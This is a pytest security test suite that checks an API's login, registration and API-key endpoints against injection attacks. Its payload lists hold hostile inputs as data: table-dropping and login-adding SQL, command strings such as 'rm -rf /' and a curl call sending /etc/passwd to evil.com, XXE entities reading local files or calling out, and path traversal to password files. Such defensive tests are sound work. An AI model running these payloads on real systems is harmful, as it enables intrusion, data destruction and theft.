"""
Security tests for injection vulnerabilities (SQL, Command, NoSQL).

Tests for:
- SQL injection in authentication endpoints
- SQL injection in API key operations
- SQL injection in search/query operations
- Command injection in system operations
- NoSQL injection in Redis/cache operations
"""

import pytest
from httpx import AsyncClient


# ============================================================
# SQL INJECTION TESTS
# ============================================================


@pytest.mark.security
class TestSQLInjection:
    """Test SQL injection prevention in all endpoints"""

    # Common SQL injection payloads
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "'; DROP TABLE users--",
        "1'; DROP TABLE users--",
        "'; EXEC xp_cmdshell('dir')--",
        "1'; EXEC sp_addlogin 'hacker','password'--",
        "' AND 1=0 UNION ALL SELECT 'admin', 'admin'--",
        "1' AND 1=2 UNION SELECT NULL, table_name FROM information_schema.tables--",
    ]

    async def test_sql_injection_login_email(self, auth_client: AsyncClient):
        """Test SQL injection attempts in login email field"""
        for payload in self.SQL_INJECTION_PAYLOADS:
            response = await auth_client.post(
                "/auth/login",
                json={
                    "email": payload,
                    "password": "ValidPassword123!"
                }
            )

            # Should not return 500 (server error) or 200 (successful login)
            assert response.status_code in [401, 422, 400], \
                f"SQL injection payload '{payload}' returned unexpected status: {response.status_code}"

            # Should not return sensitive data
            if response.status_code != 401:
                data = response.json()
                assert "access_token" not in data, \
                    f"SQL injection payload '{payload}' bypassed authentication!"

    async def test_sql_injection_login_password(self, auth_client: AsyncClient, test_user):
        """Test SQL injection attempts in login password field"""
        for payload in self.SQL_INJECTION_PAYLOADS:
            response = await auth_client.post(
                "/auth/login",
                json={
                    "email": test_user["email"],
                    "password": payload
                }
            )

            # Should fail authentication
            assert response.status_code == 401, \
                f"SQL injection payload in password '{payload}' returned unexpected status: {response.status_code}"

            data = response.json()
            assert "access_token" not in data, \
                f"SQL injection in password '{payload}' bypassed authentication!"

    async def test_sql_injection_register_email(self, auth_client: AsyncClient):
        """Test SQL injection attempts in registration email field"""
        for payload in self.SQL_INJECTION_PAYLOADS:
            response = await auth_client.post(
                "/auth/register",
                json={
                    "email": payload,
                    "password": "ValidPassword123!",
                    "full_name": "Test User"
                }
            )

            # Should fail validation or return error
            assert response.status_code in [422, 400, 409], \
                f"SQL injection payload in register '{payload}' returned unexpected status: {response.status_code}"

    async def test_sql_injection_register_name(self, auth_client: AsyncClient):
        """Test SQL injection attempts in registration full_name field"""
        malicious_names = [
            "'; DROP TABLE users--",
            "Robert'); DROP TABLE users--",
            "' OR '1'='1",
            "<script>alert('xss')</script>",
        ]

        for name in malicious_names:
            response = await auth_client.post(
                "/auth/register",
                json={
                    "email": f"test_{hash(name)}@example.com",
                    "password": "ValidPassword123!",
                    "full_name": name
                }
            )

            # Should either create user with escaped name or reject
            # But should NOT execute SQL
            assert response.status_code in [201, 422, 400], \
                f"Malicious name '{name}' caused unexpected status: {response.status_code}"

    async def test_sql_injection_boolean_based(self, auth_client: AsyncClient, test_user):
        """Test boolean-based blind SQL injection"""
        # These payloads attempt to infer information through true/false responses
        blind_payloads = [
            ("admin' AND '1'='1", "admin' AND '1'='2"),  # True vs False
            ("admin' AND SLEEP(5)--", "admin'--"),  # Time-based
        ]

        for true_payload, false_payload in blind_payloads:
            # Both should fail the same way
            response1 = await auth_client.post(
                "/auth/login",
                json={"email": true_payload, "password": "test"}
            )

            response2 = await auth_client.post(
                "/auth/login",
                json={"email": false_payload, "password": "test"}
            )

            # Both should return 401 (unauthorized)
            assert response1.status_code == 401
            assert response2.status_code == 401

    async def test_sql_injection_union_based(self, auth_client: AsyncClient):
        """Test UNION-based SQL injection to extract data"""
        union_payloads = [
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT username, password FROM users--",
            "' UNION ALL SELECT table_name,NULL FROM information_schema.tables--",
        ]

        for payload in union_payloads:
            response = await auth_client.post(
                "/auth/login",
                json={
                    "email": payload,
                    "password": "test"
                }
            )

            assert response.status_code in [401, 422, 400]

            # Verify no data leakage in response
            data = response.json()
            assert "access_token" not in data
            # Should not contain database structure info
            assert "table_name" not in str(data).lower()
            assert "information_schema" not in str(data).lower()

    async def test_sql_injection_time_based(self, auth_client: AsyncClient):
        """Test time-based blind SQL injection"""
        import time

        time_payloads = [
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
        ]

        for payload in time_payloads:
            start = time.time()
            response = await auth_client.post(
                "/auth/login",
                json={
                    "email": payload,
                    "password": "test"
                }
            )
            elapsed = time.time() - start

            # Should fail quickly, not delay for 5 seconds
            assert elapsed < 2, \
                f"Time-based SQL injection '{payload}' caused {elapsed}s delay!"
            assert response.status_code in [401, 422, 400]

    async def test_sql_injection_stacked_queries(self, auth_client: AsyncClient):
        """Test stacked queries (multiple SQL statements)"""
        stacked_payloads = [
            "'; DELETE FROM users WHERE '1'='1",
            "'; UPDATE users SET is_superuser=true WHERE '1'='1",
            "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'hacked')--",
        ]

        for payload in stacked_payloads:
            response = await auth_client.post(
                "/auth/login",
                json={
                    "email": payload,
                    "password": "test"
                }
            )

            assert response.status_code in [401, 422, 400]

        # Verify that no unauthorized changes were made
        # (This is implicitly tested by subsequent tests using test_user)

    async def test_sql_injection_in_api_key_operations(self, auth_client: AsyncClient, auth_token):
        """Test SQL injection in API key operations"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE api_keys--",
        ]

        for payload in sql_payloads:
            # Test in API key name
            response = await auth_client.post(
                "/api-keys/",
                headers={"Authorization": f"Bearer {auth_token}"},
                json={
                    "name": payload,
                    "scopes": ["read:agents"]
                }
            )

            # Should either create key with escaped name or reject
            assert response.status_code in [200, 201, 422, 400]

            if response.status_code in [200, 201]:
                # If created, the name should be escaped/sanitized
                data = response.json()
                # The SQL should not be executed
                assert "DROP TABLE" not in data.get("name", "")


# ============================================================
# COMMAND INJECTION TESTS
# ============================================================


@pytest.mark.security
class TestCommandInjection:
    """Test command injection prevention"""

    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "|| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; rm -rf /",
        "| rm -rf /",
        "&& rm -rf /",
        "\n/bin/ls",
        "\ncat /etc/passwd",
        "; curl http://evil.com/steal?data=$(cat /etc/passwd)",
    ]

    async def test_command_injection_in_user_inputs(self, auth_client: AsyncClient):
        """Test that user inputs don't allow command execution"""
        for payload in self.COMMAND_INJECTION_PAYLOADS:
            # Test in registration (full_name field)
            response = await auth_client.post(
                "/auth/register",
                json={
                    "email": f"cmd_inject_{hash(payload)}@example.com",
                    "password": "ValidPassword123!",
                    "full_name": payload
                }
            )

            # Should not cause server error (500)
            assert response.status_code in [201, 422, 400, 409], \
                f"Command injection '{payload}' caused unexpected status: {response.status_code}"

    async def test_command_injection_in_email(self, auth_client: AsyncClient):
        """Test command injection in email fields"""
        for payload in self.COMMAND_INJECTION_PAYLOADS:
            response = await auth_client.post(
                "/auth/login",
                json={
                    "email": payload,
                    "password": "test"
                }
            )

            # Should fail validation or authentication, not execute commands
            assert response.status_code in [401, 422, 400]


# ============================================================
# NOSQL INJECTION TESTS
# ============================================================


@pytest.mark.security
class TestNoSQLInjection:
    """Test NoSQL injection prevention (Redis, MongoDB patterns)"""

    NOSQL_INJECTION_PAYLOADS = [
        {"$gt": ""},
        {"$ne": None},
        {"$ne": 1},
        {"$where": "1==1"},
        {"$regex": ".*"},
        {"$exists": True},
    ]

    async def test_nosql_injection_in_json_inputs(self, auth_client: AsyncClient):
        """Test NoSQL injection in JSON input fields"""
        # Test if the API accepts dict/object where string is expected
        for payload in self.NOSQL_INJECTION_PAYLOADS:
            response = await auth_client.post(
                "/auth/login",
                json={
                    "email": payload,  # NoSQL injection attempt
                    "password": "test"
                }
            )

            # Should fail validation (422) not authentication (401)
            assert response.status_code in [422, 400], \
                f"NoSQL injection payload {payload} was not properly rejected"


# ============================================================
# LDAP INJECTION TESTS
# ============================================================


@pytest.mark.security
class TestLDAPInjection:
    """Test LDAP injection prevention"""

    LDAP_INJECTION_PAYLOADS = [
        "*",
        "*)(uid=*",
        "admin)(|(password=*))",
        "*)(|(uid=*))",
        "*)(&",
        "*))%00",
    ]

    async def test_ldap_injection_patterns(self, auth_client: AsyncClient):
        """Test LDAP injection patterns in inputs"""
        for payload in self.LDAP_INJECTION_PAYLOADS:
            response = await auth_client.post(
                "/auth/login",
                json={
                    "email": payload,
                    "password": "test"
                }
            )

            # Should fail authentication properly
            assert response.status_code in [401, 422, 400]


# ============================================================
# XML INJECTION / XXE TESTS
# ============================================================


@pytest.mark.security
class TestXMLInjection:
    """Test XML External Entity (XXE) injection prevention"""

    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>',
    ]

    async def test_xxe_in_content_type(self, auth_client: AsyncClient):
        """Test that XML is not processed if sent"""
        for payload in self.XXE_PAYLOADS:
            response = await auth_client.post(
                "/auth/login",
                headers={"Content-Type": "application/xml"},
                content=payload
            )

            # Should reject XML content (415 Unsupported Media Type) or validation error
            assert response.status_code in [415, 422, 400]


# ============================================================
# PATH TRAVERSAL TESTS
# ============================================================


@pytest.mark.security
class TestPathTraversal:
    """Test path traversal prevention"""

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
    ]

    async def test_path_traversal_in_inputs(self, auth_client: AsyncClient):
        """Test path traversal in user inputs"""
        for payload in self.PATH_TRAVERSAL_PAYLOADS:
            response = await auth_client.post(
                "/auth/register",
                json={
                    "email": f"path_{hash(payload)}@example.com",
                    "password": "ValidPassword123!",
                    "full_name": payload
                }
            )

            # Should not cause server errors or path access
            assert response.status_code in [201, 422, 400, 409]
